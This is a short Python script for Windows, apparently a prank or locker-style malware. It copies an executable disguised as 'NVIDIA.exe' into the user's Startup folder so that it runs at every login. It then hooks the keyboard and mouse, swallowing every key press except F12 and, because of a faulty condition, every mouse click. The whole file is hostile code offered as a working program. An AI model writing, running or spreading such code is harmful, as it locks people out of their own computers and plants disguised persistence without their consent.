import os
import pythoncom
import pyHook
import win32api
import win32con
import shutil
from time import *
	
def onMouseEvent(event):
	try:
		pass
	except TypeError as e:
		print e
	if event.MessageName=="mouse move":
		return True
	elif event.MessageName=="mouse left down" or "mouse left up" or "mouse right down" or "mouse left up":
		return False

def onKeyboardEvent(event):
	if event.Key=="F12":
		win32api.PostQuitMessage()
		return True
	else:
		return False

def Ucopy():
	key=win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0,win32con.KEY_READ)
	startup=win32api.RegQueryValueEx(key,'Startup')[0]
	dir=os.path.abspath('.')
	try:
		shutil.copy(str(dir)+'/NVIDIA.exe',startup)
	except Exception as e:
		pass
		
def main():
	Ucopy()
	hm=pyHook.HookManager()
	hm.KeyDown=onKeyboardEvent
	hm.HookKeyboard()
	hm.MouseAll=onMouseEvent
	hm.HookMouse()
	pythoncom.PumpMessages()

if __name__ == "__main__":
	main()
